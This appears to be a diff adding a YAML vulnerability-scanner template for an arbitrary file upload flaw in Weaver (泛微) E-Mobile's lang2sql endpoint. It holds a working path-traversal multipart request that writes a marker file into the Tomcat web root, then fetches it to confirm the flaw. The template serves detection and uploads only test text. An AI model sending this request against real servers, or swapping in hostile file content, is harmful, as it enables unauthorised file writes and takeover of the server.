@@ -1,0 +1,17 @@
+name: 泛微E-Mobile-lang2sql-文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:    
+  - method: POST
+    path: /emp/lang2sql?client_type=1&lang_tag=1
+    headers:
+      Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK     
+    body: "------WebKitFormBoundarymVk33liI64J7GQaK\r\nContent-Disposition: form-data; name=\"file\";filename=\"../../../../appsvr/tomcat/webapps/ROOT/Rscan.txt\"\r\n\r\nRscan_test\r\n------WebKitFormBoundarymVk33liI64J7GQaK--"
+    expression:
+  - method: GET
+    path: /Rscan.txt
+    expression:
+      status: 200
+      body_all: ["Rscan_test"]
